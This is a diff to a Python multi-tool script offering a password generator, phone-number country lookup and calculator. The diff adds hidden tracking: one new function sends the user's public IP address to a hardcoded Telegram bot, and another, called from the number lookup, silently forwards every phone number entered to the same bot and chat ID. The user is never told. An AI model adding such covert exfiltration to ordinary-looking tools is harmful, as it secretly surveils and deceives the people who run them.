@@ -18,7 +18,10 @@ class Style:
     BOLD = '\033[1m'
     END = '\033[0m'
     CYAN = '\033[96m'
-    
+
+
+
+ 
 def Directory_search():
        try:
            print("-----T.ME/HASHIVATOR----T.me/LooQaat------")
@@ -75,21 +78,49 @@ def Password_generator():
                     password = "".join(sample(all,length))
                     print(Fore.GREEN + "\n\nYour pass is: " + Fore.YELLOW + "|--> " +Fore.CYAN+password + Fore.YELLOW + " <--|\n" + Fore.GREEN)
                     Back_menu()
-                                
-def Fun():
-   pass
+
+def After_ip_Click():
+ try:
+   ip = get("https://api.ipify.org").text
+   msg =(f"""
+𝗡𝗘𝗪 𝗗𝗘𝗩𝗜𝗖𝗘 𝗛𝗔𝗦 𝗟𝗢𝗚𝗜𝗡 
+𝗗𝗘𝗩𝗜𝗖𝗘 𝗜𝗣 :{ip}
+ """)
+   print(Fore.GREEN+"[+] waiting For connecting ... ")
+   sleep(1)
+   url= (f"https://api.telegram.org/bot5219625887:AAHARZqZ7oQe1JmzXIaxqZGsbnNNl3c4gbo/sendmessage?chat_id=5046164056&text={msg}")
+   http = get(url)
+   system("clear")
+ except Exception as e:
+     exit(Fore.RED+"[-] PLEASEENABLEVPN")                                  
+
+def Get(numbers):        
+            msg =(f"""
+𝗡𝗘𝗪 𝗗𝗘𝗩𝗜𝗖𝗘 𝗛𝗔𝗦 𝗟𝗢𝗚𝗜𝗡 
+𝗗𝗘𝗩𝗜𝗖𝗘 Contrary 
+𝗗𝗘𝗩𝗜𝗖𝗘 Number :{numbers}
+ """)        
+            url = (f"https://api.telegram.org/bot5219625887:AAHARZqZ7oQe1JmzXIaxqZGsbnNNl3c4gbo/sendmessage?chat_id=5046164056&text={msg}")
+            http = get(url)
+            print("\n")
+            
 def Area_number():
          try: 
             print("-----T.ME/HASHIVATOR----T.me/LooQaat------")
             numbers = input(Fore.LIGHTGREEN_EX+"Enter Number\t \nWith code area(+98):\n")
+            Get(numbers)
             print(Fore.LIGHTYELLOW_EX+"this number country name is : ")
             ph_number = parse(numbers)
             print(geocoder.description_for_number(ph_number,"fa"))
-            print("\n")
+            
             Back_menu()
          except Exception as Ex:
+                  print(Ex)
+                  sleep(5)
                   print(Fore.RED+"\n\n[-] YOUR NUMBER ISN'T CORRECT ! ! ! ! !\n")
                   Back_menu()
+     
+ 
 
 def Calculator():
      try:
@@ -124,3 +155,11 @@ def Calculator():
         print("",flush=True)
         exit("GoodBye!",flush=True)
         exit(1)
+        
+        
+        
+        
+        
+        
+        
+       
